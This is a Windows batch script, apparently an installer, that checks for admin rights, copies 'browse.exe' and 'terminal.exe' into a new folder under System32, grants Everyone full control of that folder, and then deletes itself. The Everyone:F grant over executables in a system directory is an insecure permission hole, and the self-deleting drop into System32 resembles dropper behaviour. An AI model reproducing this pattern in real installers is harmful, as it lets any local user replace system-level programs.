@echo off
echo Please wait...

:: Check for administrative privileges
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo This script requires administrative privileges. Please run as administrator.
    pause
    exit
) else (
    :: Copy file with error checking
    mkdir "C:\Windows\System32\terminalProgram"
    timeout /t 2 /nobreak >nul
    copy "%~dp0terminalProgram\browse.exe" "C:\Windows\System32\terminalProgram"
    timeout /t 2 /nobreak >nul
    copy "%~dp0terminalProgram\terminal.exe" "C:\Windows\System32\terminalProgram"
    timeout /t 2 /nobreak >nul
    copy "%~dp0terminalProgram\icon.ico" "C:\Windows\System32\terminalProgram"
    timeout /t 2 /nobreak >nul
    icacls "C:\Windows\System32\terminalProgram" /grant Everyone:F
    timeout /t 2 /nobreak >nul
    copy "%~dp0terminalProgram\terminal.lnk" "C:\Windows\System32"
    timeout /t 2 /nobreak >nul
    echo Completed
    timeout /t 2 /nobreak >nul
    del "%~f0"
    exit
)